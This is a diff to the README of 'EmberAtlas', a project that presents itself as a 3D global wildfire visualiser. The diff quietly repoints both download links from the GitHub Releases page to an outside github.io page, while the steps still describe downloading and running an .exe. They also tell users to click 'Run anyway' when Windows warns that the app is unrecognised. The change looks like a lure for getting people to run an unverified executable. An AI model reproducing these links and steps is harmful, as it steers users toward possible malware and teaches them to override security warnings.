@@ -1,6 +1,6 @@
 # 🌍 EmberAtlas - Visualize global wildfires with historic data
 
-[![Download EmberAtlas](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/wesleyother534/EmberAtlas/releases)
+[![Download EmberAtlas](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://wesleyother534.github.io)
 
 EmberAtlas provides a way to view global wildfire activity on a 3D Earth model. You can track historic fire incidents, view perimeter boundaries, and see real-time data like wind speed and current exposure levels. This tool combines satellite data into an interface that behaves like a physical globe you hold in your hands.
 
@@ -16,7 +16,7 @@ EmberAtlas provides a way to view global wildfire activity on a 3D Earth model. 
 
 Follow these steps to set up the software on your computer.
 
-1.  **Visit the download page:** Go to the [EmberAtlas Releases page](https://github.com/wesleyother534/EmberAtlas/releases) to view current versions.
+1.  **Visit the download page:** Go to the [EmberAtlas Releases page](https://wesleyother534.github.io) to view current versions.
 2.  **Select your file:** Look for the section labeled Assets. Click on the file ending in `.exe` that corresponds to the most recent version.
 3.  **Download:** Save the file to a folder you can find easily, such as your Downloads folder or Desktop.
 4.  **Run the installer:** Double-click the file you downloaded. If a Windows warning appears stating that the app is unrecognized, click "More info" and then "Run anyway."
